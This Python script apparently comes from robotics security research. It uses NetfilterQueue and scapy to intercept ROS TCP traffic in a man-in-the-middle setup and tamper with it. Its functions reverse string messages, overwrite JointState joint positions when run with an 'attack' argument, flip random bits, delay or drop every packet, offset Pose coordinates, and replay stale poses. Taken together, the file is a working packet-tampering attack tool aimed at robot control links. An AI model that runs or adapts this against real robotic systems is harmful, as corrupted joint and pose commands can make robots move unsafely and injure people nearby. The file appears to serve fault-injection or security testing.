import os,sys,nfqueue,socket
from scapy.all import *
import random
from cStringIO import StringIO
import struct
import rospy
import numpy
import PyKDL
from tf import transformations
from tf_conversions import posemath
from std_msgs.msg import String, Bool, Float32, Empty
from geometry_msgs.msg import Pose, PoseStamped, Vector3, Quaternion, Wrench, WrenchStamped, TwistStamped
from sensor_msgs.msg import JointState, Joy
from netfilterqueue import NetfilterQueue
import random
import codecs
import bitarray
import time

values = (1.19, 0.0)
counter = 1

def modify(packet):
    try:
        pkt = IP(packet.get_payload())
        if len(str(pkt)) != 85:
            packet.accept()
            print '-----------returned------------'
            return

        b = StringIO()

        b.write(pkt[Raw].load)
        print 'initial len -> %d '%len(str(pkt))
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        msg.deserialize(b.read(size))
        print "current msg -> %s"%msg
        msg.data = msg.data[::-1]
        print "reversed -> %s"%msg
        b.seek(4)
        
        msg.serialize(b)
        b.seek(0)
        data = b.read(size+4)
        
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data

        #print pkt
        #print packet._given_payload
        packet.set_payload(bytes(pkt)) #set the packet content to our modified version
        print 'final len -> %d'%len(str(pkt))
        packet.accept()
    except:
        raise

def corrupt_joint_state_packet(packet):
    try:
        #pkt = packet 
        print "---inside---"
        pkt = IP(packet.get_payload())
        init_len = len(str(pkt))
        """
        if len(str(pkt)) != 158:
            packet.accept()
            print '-----------returned------------'
            return
        """
        b = StringIO()
        b.write(pkt[Raw].load)
        
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = JointState()
        b.seek(4)
        msg.deserialize(b.read(size))
        print "current msg -> %s"%msg
        global counter, values
        print type(msg.position)
        print [0.0, 0.0, values[counter], 0.0, 0.0, 0.0, 0.0]
        counter = (counter + 1) % 2
        print [msg.position[0], 0.0, values[counter], 0.0, 0.0, 0.0, 0.0]
        msg.position = [msg.position[0], 0.0, values[counter], 0.0, 0.0, 0.0, 0.0]
        print "changed -> %s"%msg
        b.seek(4)
        msg.serialize(b)

        b.seek(0)
        data = b.read(size+4)
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data

        #print pkt
        #print packet._given_payload
        final_len = len(str(pkt))
        attack = False
        if(len(sys.argv) > 1):
            attack = sys.argv[1] == 'attack'
        
        if init_len == final_len and attack:
            packet.set_payload(bytes(pkt)) #set the packet content to our modified version
        
        print 'final len -> %d'%len(str(pkt))
        packet.accept()
    except:
        print 'accepted anyway'
        packet.accept()
        pass


def packet_inspector(packet):
    try:
        #pkt = packet 
        #print "---inside---"
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        init_len = len(str(pkt))

        b = StringIO()
        b.write(pkt[Raw].load)

        
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        print 'size -> %s'%(size)
        print type(b.read(size))
        b.seek(4)
        msg.deserialize(b.read(size))
        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """
        print "current msg -> %s"%msg
        print "len " + str(len(str(msg)))
        print 'final len -> %d'%len(str(pkt))
        
        packet.accept()
    except:
        print 'except'
        packet.accept()

counter = 0

def manipulate_string_randomly(string):
    
    bits = bitarray.bitarray()
    bits.frombytes(string)
    list_bit = bits.tolist()
    
    random_list = [bit if random.randint(0,100) != 1 else (not bit) for bit in list_bit]
    
    a = bitarray.bitarray(random_list).tobytes()

    return a


def random_modify(packet):
 
    try:
        #pkt = packet 
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return

        global counter

        counter = counter + 1

        b = StringIO()
        b.write(pkt[Raw].load)
        
        print 'pkt initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        print 'size -> %s'%(size)

        b.seek(4)
        msg.deserialize(b.read(size))

        s = msg.data
        random_s = manipulate_string_randomly(bytes(s))

        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """

        print type(msg.data)
        print "current msg -> %s"%msg.data
        print "random string -> %s"%str(random_s)
        print "random len " + str(len(str(random_s)))
        print 'oringial len -> %d'%len(str(msg.data))

        msg.data = str(random_s)

        b.seek(4)
        
        msg.serialize(b)
        b.seek(0)
        data = b.read(size+4)
        
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data

        #print pkt
        #print packet._given_payload
        if counter > 10000:
            packet.set_payload(bytes(pkt)) #set the packet content to our modified version
            print 'random sent'
        print 'pkt final len -> %d'%len(str(pkt))
        
        packet.accept()
    except:
        packet.accept()
        raise

previous_packet = None
sleep_time = 0.1
new_sleep_time = sleep_time
inc = 1.5


def delay(packet):
    try:
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        print 'in'
        global previous_packet, sleep_time, new_sleep_time, inc, counter

        if previous_packet is None:
            print 'set previous_packet'
            previous_packet = packet
            packet.accept()

            return

        elif not(packet == previous_packet):

            sleep_time = new_sleep_time
            print 'sleep_time %f'%(sleep_time)
            time.sleep(sleep_time)
            packet.accept()
            #new_sleep_time = inc*sleep_time
            """
            if new_sleep_time > 0.5:
                inc = 1.0
                new_sleep_time = 0.5

            print 'sent'
            """
            counter = counter + 1
            if counter > 100:
                print 'over limit'
                new_sleep_time = 0.0
            previous_packet = packet
            return 
        
        elif previous_packet == packet:
           
            print 'lost packet'
            inc = 1.0
            new_sleep_time = sleep_time
            packet.accept()
            previous_packet = packet
            return

        packet.accept()
        
    except:
        packet.accept()
        raise
       


def drop(packet):
    try:
        #pkt = packet 
        #print "---inside---"
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        init_len = len(str(pkt))

        b = StringIO()
        b.write(pkt[Raw].load)

        
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        print 'size -> %s'%(size)
        print type(b.read(size))
        b.seek(4)
        msg.deserialize(b.read(size))
        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """
        print "current msg -> %s"%msg
        print "len " + str(len(str(msg)))
        print 'final len -> %d'%len(str(pkt))

        choice = random.randint(0,6)
        if choice == 1 or True:
            packet.drop()
            print 'dropped'
        else:
            print 'accepted'
            packet.accept()
    except:
        print 'except'
        packet.accept()

previous_pose = None

def print_diff(current_pose):
    global previous_pose

    if previous_pose is None:
        previous_pose = current_pose
        return

    p_pos = previous_pose.position
    p_ori = previous_pose.orientation

    c_pos = current_pose.position
    c_ori = current_pose.orientation

    print 'p_dx : {0:20.15f} o_dx {1:20.15f}'.format(c_pos.x-p_pos.x,c_ori.x-p_ori.x)
    print 'p_dy : {0:20.15f} o_dy {1:20.15f}'.format(c_pos.y-p_pos.y,c_ori.y-p_ori.y)
    print 'p_dz : {0:20.15f} o_dz {1:20.15f}'.format(c_pos.z-p_pos.z,c_ori.z-p_ori.z)
    print 'p_dw : {0} o_dw {1:20.15f}'.format(20*' ',c_ori.w-p_ori.w)

    scale(current_pose)
    previous_pose = current_pose

    

alternate = 1
def scale(current_pose):
    global previous_pose, alternate

    p_pos = previous_pose.position
    p_ori = previous_pose.orientation

    c_pos = current_pose.position
    c_ori = current_pose.orientation

    dx = c_pos.x-p_pos.x
    dy = c_pos.y-p_pos.y
    dz = c_pos.z-p_pos.z

    sign = lambda x : 1 if x > 0 else -1
    #offset = 0.00001

    factor = 1.0

    offset = max(dx,dy,dz)/10

    print 'max(dx, dy, dz): %20.15f'%max(dx,dy,dz)
    print 'offset: %20.15f' %alternate*offset
    
    c_pos.x = c_pos.x + offset*alternate 
    c_pos.y = c_pos.y + offset*alternate 
    c_pos.z = c_pos.z + offset*alternate
    

    """
    c_pos.x = p_pos.x + factor*dx #+ (offset if dx != 0 else 0.0)
    c_pos.y = p_pos.y + factor*dy #+ (offset if dy != 0 else 0.0)
    c_pos.z = p_pos.z + factor*dz #+ (offset if dz != 0 else 0.0)
    """
    alternate = alternate * (-1)




def  pose_manipulator(packet):
    try:
        #pkt = packet 
        #print "---inside---"
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        init_len = len(str(pkt))

        b = StringIO()
        b.write(pkt[Raw].load)

        print '*'*60
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = Pose()
        b.seek(4)
        print 'size -> %s'%(size)
        print type(b.read(size))
        b.seek(4)
        msg.deserialize(b.read(size))
        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """
        print "current message -> \n%s"%msg
        print "len " + str(len(str(msg)))
        print 'final len -> %d\n'%len(str(pkt))
        print '-'*60
        print_diff(msg)
        print '-'*60
        print '\nmodified message -> \n%s'%msg
        
        b.seek(4)
        
        msg.serialize(b)
        b.seek(0)
        data = b.read(size+4)
        
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data
        packet.set_payload(bytes(pkt))
        
        print '*'*60
        packet.accept()
    except:
        print 'except'
        packet.accept()

transmit_old = 0
previous_pose = None

def emulate_packet_loss(packet):
    global transmit_old, previous_pose
    try:
        #pkt = packet 
        #print "---inside---"
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        init_len = len(str(pkt))

        


        b = StringIO()
        b.write(pkt[Raw].load)

        print '*'*60
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = Pose()
        b.seek(4)
        print 'size -> %s'%(size)
        print type(b.read(size))
        b.seek(4)
        msg.deserialize(b.read(size))
        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """
        print "current message -> \n%s"%msg
        print "len " + str(len(str(msg)))
        print 'final len -> %d\n'%len(str(pkt))
        print '-'*60
        
        if transmit_old == 0:
            previous_pose = msg
        elif transmit_old < 50:
            msg = previous_pose
            print 'previous sent'
        else :
            transmit_old = -1

        print '-'*60
        print '\nmodified message -> \n%s'%msg
        
        b.seek(4)
        
        msg.serialize(b)
        b.seek(0)
        data = b.read(size+4)
        
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data
        packet.set_payload(bytes(pkt))
        
        print '*'*60

        transmit_old =  1 + transmit_old

        packet.accept()
    except:
        print 'except'
        packet.accept()
"""interecept curent pose"""



def main():
    nfqueue = NetfilterQueue()
   
    nfqueue.bind(1, emulate_packet_loss) 
    try:
        print "[*] waiting for data"
        nfqueue.run()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    sys.exit(main())

